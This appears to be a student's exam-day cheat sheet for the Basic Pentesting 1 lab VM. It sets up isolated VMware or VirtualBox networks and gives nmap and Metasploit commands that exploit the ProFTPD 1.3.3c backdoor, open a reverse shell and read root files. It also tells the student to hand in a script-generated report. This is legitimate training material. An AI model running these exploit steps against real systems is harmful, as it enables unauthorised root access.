# 🧪 EXAM-DAY QUICK CARD — Basic Pentesting 1

Everything is on this pendrive. No internet needed.

---

## 0. Check the PC's OS (5 sec)
- **Windows** = Start button bottom-left → follow **WINDOWS** steps.
- **Ubuntu** = "Activities" top-left / purple desktop → follow **UBUNTU** steps.

Files on pendrive (`CyberLab/` folder):
- `installers/VMware-Workstation-Full-...exe`  (Windows)
- `installers/VMware-Workstation-Full-...bundle` (Linux)
- VMs/ISOs are in the pendrive root (`basic_pentesting_1.ova`, Kali `.vmwarevm`, ISOs)
- all scripts (`basic1_pwn.sh`, etc.)

---

## 1A. WINDOWS — install VMware
1. Double-click `installers\VMware-Workstation-Full-26H1u1-25688693.exe`
2. Next → accept EULA → Next → Install → Finish. (Skip license key → "Use for free, personal".)
3. Reboot if asked.

## 1B. UBUNTU — install VMware
Open a terminal in the `installers` folder:
```bash
chmod +x VMware-Workstation-Full-26H1u1-25688693.x86_64.bundle
sudo ./VMware-Workstation-Full-26H1u1-25688693.x86_64.bundle --console --required --eulas-agreed
sudo vmware-modconfig --console --install-all
```
(If modules fail → disable Secure Boot in BIOS. Or use pre-installed VirtualBox instead.)

---

## 2. Open the VMs
**VMware:**
- Kali: `File > Open` → copy the `kali-...-vmware-amd64.vmwarevm` off the pendrive first → open its `.vmx`. Login: **kali / kali**
- Target: `File > Open` → `basic_pentesting_1.ova` → accept conversion.

**VirtualBox (fallback):**
- `File > Import Appliance` → `basic_pentesting_1.ova`.
- Kali: import OVA too, or `New` → attach `kali-...-installer-amd64.iso`.

> Copy VMs from the pendrive to the PC's disk before running — faster + avoids USB wear.

---

## 3. Network — isolate attacker + target (DO THIS)
Goal: Kali and target see each other, NOT the campus LAN.

**VMware:**
- Kali → VM Settings → Network Adapter: add **NAT** (internet) + **Host-only**.
- Target → Network Adapter: **Host-only** (same one).

**VirtualBox:**
- Kali → Settings → Network: Adapter1 = **NAT**, Adapter2 = **Host-only Adapter**.
- Target → Adapter1 = **Host-only Adapter** (same network, e.g. vboxnet0).

**Never use Bridged.** Snapshot both VMs now.

---

## 4. Attack (on Kali)
```bash
# find target IP
sudo netdiscover -r 192.168.56.0/24      # or your host-only subnet
# OR copy the script off pendrive and let it discover:
sudo ./basic1_pwn.sh --discover

# run full attack + auto-generate report
sudo ./basic1_pwn.sh <TARGET_IP>
```

Script auto-installs nmap/metasploit/netdiscover (needs Kali internet via NAT), then:
nmap → ProFTPD 1.3.3c backdoor → **root** → post-exploit → writes `Lab3_Report_Basic1.md`.

**Manual, if script fails:**
```bash
nmap -T4 -A <TARGET_IP> -oA scan
msfconsole
  use exploit/unix/ftp/proftpd_133c_backdoor
  set RHOSTS <TARGET_IP>
  set payload cmd/unix/reverse
  set LHOST <YOUR_KALI_IP>
  exploit
# in shell:
id ; uname -a ; ls -la /root ; cat /root/*.txt
```

---

## 5. Report
Hand in `Lab3_Report_Basic1.md` (auto-made) — has Aim/Objective/Theory/Procedure/
Output/Conclusion with your real output. Screenshot: nmap ports, the root shell, `id` = uid=0.

---

## Troubleshoot
- Can't reach target → both must be **same Host-only** net. `ping <target>`.
- No internet on Kali → Adapter1 must be **NAT**, enabled.
- Exploit fails → nmap must show **ProFTPD 1.3.3c** on port 21; right IP; fresh snapshot.
- No admin to install VMware → ask invigilator for a PC with it, or use VirtualBox if present.

**Backup (if pendrive dies, PC has internet):**
```bash
git clone https://github.com/CyberJarvis/CyberLab.git
```
